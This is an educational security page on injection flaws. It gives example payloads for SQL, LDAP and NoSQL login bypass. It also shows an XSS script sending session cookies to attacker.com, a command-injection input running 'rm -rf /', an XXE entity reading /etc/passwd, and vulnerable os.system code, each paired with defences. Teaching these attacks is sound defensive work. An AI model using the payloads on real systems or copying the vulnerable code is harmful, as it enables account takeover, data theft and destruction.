# Injection

Injection flaws are very common in applications today. These flaws occur because the application interprets user-controlled input as commands or parameters. Injection attacks depend on what technologies are used and how these technologies interpret the input.

Injection attacks occur when an application **fails to properly validate, sanitize, or escape user input**, allowing attackers to inject malicious code into a system. These attacks can **manipulate databases, execute unauthorized commands, or exploit vulnerabilities in interpreters**.

&nbsp;

## Why Are Injection Attacks Dangerous?

- Can expose or delete sensitive data (e.g., user credentials, payment details).
- Allow attackers to take control of a server or application.
- Affect web apps, APIs, databases, operating systems, and backend services.
- Easy to execute but difficult to detect in many cases.

The main defense for preventing injection attacks is ensuring that user-controlled input is not interpreted as queries or commands. There are different ways of doing this:

- **Using an allow list:** when input is sent to the server, this input is compared to a list of safe inputs or characters. If the input is marked as safe, then it is processed. Otherwise, it is rejected, and the application throws an error.
- **Stripping input:** If the input contains dangerous characters, these are removed before processing.

Dangerous characters or input is classified as any input that can change how the underlying data is processed. Instead of manually constructing allow lists or stripping input, various libraries exist that can perform these actions for you.

## Common Types of Injection Attacks

### 1\. SQL Injection (SQLi)

SQL Injection occurs when an attacker **manipulates database queries** by injecting malicious SQL commands through user input fields. This occurs when user-controlled input is passed to <span style="color: inherit;">SQL</span> queries. As a result, an attacker can pass in <span style="color: inherit;">SQL</span> queries to manipulate the outcome of such queries. This could potentially allow the attacker to access, modify and delete information in a database when this input is passed into database queries. This would mean an attacker could steal sensitive information such as personal details and credentials.

**Example Scenario:** A website has a login form:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password';
```

if the application **does not properly validate user input**, an attacker can enter:

```vbnet
Username: admin' -- 
Password: (any)
```

The resulting query:

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'password';
```

- `--` makes the rest of the query a comment, bypassing password validation.
- The attacker **logs in as an admin without knowing the password**.

### How to Prevent SQL Injection

- Use Prepared Statements (Parameterized Queries):

```python
import sqlite3
conn = sqlite3.connect('database.db')
cursor = conn.cursor()
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

- Use ORM frameworks (e.g., SQLAlchemy, Hibernate).
- Sanitize and validate user input.
- Limit database privileges to reduce impact.

### 2\. Cross-Site Scripting (XSS)

XSS occurs when attackers inject **malicious JavaScript** into a web page, which is then executed in a victim’s browser.

**Example Attack:** A comment section allows users to submit messages without input validation. An attacker submits:

```html
<script>alert('Hacked!');</script>
```

If the input is not sanitized, every user who views the comment will see an alert box pop up.

**More Dangerous Variant:**

```html
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

This **steals session cookies**, allowing the attacker to hijack user accounts.

### How to Prevent XSS

- Escape user input using HTML entity encoding (e.g., `&lt;script&gt;`).
- Use Content Security Policy (CSP) to block inline scripts.
- Sanitize input with libraries like DOMPurify.

### 3\. Command Injection

Command Injection occurs when user input is passed **directly to system commands**. As a result, an attacker can execute arbitrary system commands on application servers, potentially allowing them to access users' systems.

**Example Vulnerable Code (Python):**

```python
import os
filename = input("Enter filename:")
os.system("cat " + filename)  # ❌ Vulnerable
```

**Attacker Input:**

```bash
; rm -rf /  # Deletes everything on the server
```

The executed command:

```bash
cat ; rm -rf /
```

This can completely destroy a system!

### How to Prevent Command Injection

- Use parameterized system calls (`subprocess.run()` instead of `os.system()`).

```python
import subprocess
filename = input("Enter filename:")
subprocess.run(["cat", filename], check=True)  # ✅ Safe
```

- Avoid executing user input as system commands.
- Use allowlists for permitted input values.

### 4\. LDAP Injection

LDAP Injection occurs when user input **manipulates an Lightweight Directory Access Protocol (LDAP) query**, allowing unauthorized access to user data.

**Example Attack:** A login function queries LDAP:

```ldap
(&(user=admin)(password=password))
```

If the attacker enters:

```makefile
Username: *)(&
Password: anything
```

The query becomes:

```ldap
(& (user=*)(&) (password=anything) )
```

- `user=*` matches **all users**, logging the attacker in as any user.

### How to Prevent LDAP Injection

- Use parameterized LDAP queries.
- Sanitize input by escaping special characters (e.g., `*`, `(`, `)`, `&`).
- Use libraries that support safe LDAP queries.

### 5\. XML External Entity (XXE) Injection

XXE attacks exploit insecure XML parsers to read files or perform Server-Side Request Forgery (SSRF).

**Example Vulnerable XML:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <user>&xxe;</user>
</root>
```

If an application **parses this XML**, it will **expose system files like `/etc/passwd`**.

### How to Prevent XXE Injection

- Disable external entity processing in XML parsers.
- Use JSON instead of XML when possible.
- Sanitize and validate XML input.

&nbsp;

### 6\. NoSQL Injection

NoSQL Injection targets **MongoDB, Firebase, or other NoSQL databases**, where attackers manipulate queries.

E**xample Vulnerable Query (MongoDB)**

```python
user = db.users.find_one({"username": username, "password": password})
```

**Attacker Input:**

```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

**Result:** This query **matches all users**, granting unauthorized access.

### How to Prevent NoSQL Injection

- Use strict schema validation.
- Sanitize input and avoid direct query manipulation.
- Use parameterized queries (`MongoDB’s $eq operator`).

&nbsp;

## How to Detect Injection Vulnerabilities

### Manual Testing

- Try injecting **single quotes (`'`), double quotes (`"`)**, and special characters (`--`, `;`, `<script>`).
- Modify API requests using **Postman, Burp Suite, or OWASP ZAP**.
- Test with **SQLMap** for SQL injection detection.

### Automated Tools

- **Burp Suite** – Detects SQLi, XSS, and command injection.
- **OWASP ZAP** – Scans for various injection vulnerabilities.
- **SQLMap** – Finds SQL injection vulnerabilities.

* * *

## Best Practices to Prevent Injection Attacks

### 1\. Use Parameterized Queries & ORM

- **NEVER** concatenate user input directly into SQL queries.
- **Use prepared statements** instead.

```python
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

### 2\. Validate & Sanitize Input

- **Allow only expected values** (e.g., dropdown selections, numeric IDs).
- **Reject special characters** where unnecessary (`'`, `;`, `<`, `>`).
- **Use allowlists instead of blocklists**.

### 3\. Escape Output Properly

- For **SQL**, escape input before inserting it.
- For **XSS**, use `htmlspecialchars()` in PHP or `escapeHtml()` in JavaScript.

### 4\. Use Web Application Firewalls (WAFs)

- Solutions like **ModSecurity, Cloudflare, AWS WAF** can block common injection attempts.

### 5\. Apply Principle of Least Privilege (PoLP)

- Restrict database permissions so **even if an attack happens, damage is minimized**.

## Conclusion

Injection attacks remain one of the **most severe security risks**, allowing attackers to **steal data, gain admin access, or even destroy systems**. **Sanitizing input, using parameterized queries, and escaping output properly** can **effectively prevent injection attacks**.
